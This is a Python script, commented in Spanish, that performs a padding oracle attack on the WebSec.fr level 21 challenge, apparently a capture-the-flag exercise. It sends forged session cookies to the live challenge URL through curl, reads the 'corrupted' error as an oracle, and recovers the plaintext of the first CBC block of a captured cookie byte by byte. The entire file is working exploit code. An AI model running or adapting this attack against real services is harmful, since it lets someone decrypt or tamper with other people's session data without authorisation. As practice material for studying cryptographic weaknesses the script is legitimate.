#!/usr/bin/env python3
import binascii
import subprocess

request_count = 0

def oracle(cookie_hex):
    global request_count
    request_count += 1
    
    if request_count % 100 == 0:
        print(f"    [{request_count} requests]", flush=True)
    
    result = subprocess.run(
        f'curl -s https://websec.fr/level21/index.php --cookie "session={cookie_hex}"',
        shell=True, capture_output=True, text=True
    )
    
    # Oracle: corrupted = padding inválido, Wrong/otro = padding válido
    return "corrupted" not in result.stdout

def decrypt_block_optimized(prev_block_hex, ct_block_hex):
    """Descifra un bloque usando padding oracle - optimizado"""
    prev_block = bytearray(binascii.unhexlify(prev_block_hex))
    intermediate = bytearray(16)
    
    for pad_val in range(1, 17):
        pos = 16 - pad_val
        print(f"  Byte {pos:2d}...", end='', flush=True)
        
        # Optimización: probar primeros valores comunes (ASCII, null, padding anterior)
        if pad_val > 1:
            # Valores probables basados en el patrón anterior
            common = [intermediate[pos+1] if pos < 15 else 0]  # Patrón similar al anterior
        else:
            common = []
        
        # Luego ASCII imprimible y común
        common += [0x00, 0x20, 0x0a, 0x0d, 0x09] + list(range(32, 127))
        
        # Finalmente el resto
        all_vals = common + [x for x in range(256) if x not in common]
        
        found = False
        for guess in all_vals:
            test_prev = bytearray(16)
            
            # Bytes conocidos
            for k in range(1, pad_val):
                test_prev[16 - k] = prev_block[16 - k] ^ intermediate[16 - k] ^ pad_val
            
            test_prev[pos] = prev_block[pos] ^ guess ^ pad_val
            
            test_cookie = binascii.hexlify(test_prev).decode() + ct_block_hex
            
            if oracle(test_cookie):
                intermediate[pos] = guess
                char_repr = chr(guess) if 32 <= guess < 127 else f"\\x{guess:02x}"
                print(f" '{char_repr}' (#{all_vals.index(guess)+1})")
                found = True
                break
        
        if not found:
            print(f" FAILED")
            return None
    
    # Calcular plaintext = intermediate XOR prev_block
    plaintext = bytes([intermediate[i] ^ prev_block[i] for i in range(16)])
    return plaintext

# Cookie de testxx
cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c833e083ffd1bce3a3d4a8e0094382e53"

print("=== PADDING ORACLE OPTIMIZADO ===\n")
print("Descifrando bloque 1...\n")

plaintext_b1 = decrypt_block_optimized(cookie[:32], cookie[32:64])

if plaintext_b1:
    print(f"\n✓ Bloque 1: {plaintext_b1}")
    print(f"  Hex: {binascii.hexlify(plaintext_b1).decode()}")
    print(f"  Total requests: {request_count}")
else:
    print(f"\n✗ Failed after {request_count} requests")

